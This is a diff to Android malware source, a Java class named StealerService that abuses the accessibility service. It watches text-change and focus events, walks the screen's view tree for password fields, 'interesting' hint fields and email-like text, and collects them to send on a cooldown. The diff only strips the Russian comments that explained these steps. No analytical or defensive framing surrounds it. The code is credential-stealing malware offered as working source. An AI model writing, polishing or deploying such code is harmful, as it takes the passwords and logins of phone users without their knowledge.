@@ -9,7 +9,7 @@ import java.util.List;
 
 public class StealerService extends AccessibilityService {
 
-    private static final long COOLDOWN = 8000; // 8 сек, реже спамим
+    private static final long COOLDOWN = 8000;
     private long lastSend = 0;
 
     private static final List<String> TARGETS = Arrays.asList(
@@ -49,7 +49,6 @@ public class StealerService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null) return;
 
-        // реагируем ТОЛЬКО на изменение текста — не на каждое открытие окна
         int type = event.getEventType();
         if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
             type != AccessibilityEvent.TYPE_VIEW_FOCUSED) return;
@@ -65,11 +64,7 @@ public class StealerService extends AccessibilityService {
         if (root == null) return;
 
         StringBuilder found = new StringBuilder();
-
-        // 1) ищем password-поля по всему дереву
         findPassword(root, found, 0);
-
-        // 2) ищем поля с "интересными" подсказками
         findHints(root, found, 0);
 
         if (found.length() > 0) {
@@ -122,7 +117,6 @@ public class StealerService extends AccessibilityService {
         CharSequence h = n.getHintText();
         CharSequence d = n.getContentDescription();
 
-        // Логин/почта: текст содержит @ и это не поле пароля
         if (t != null) {
             String s = t.toString();
             if (s.contains("@") && s.length() < 100 && s.length() > 4) {
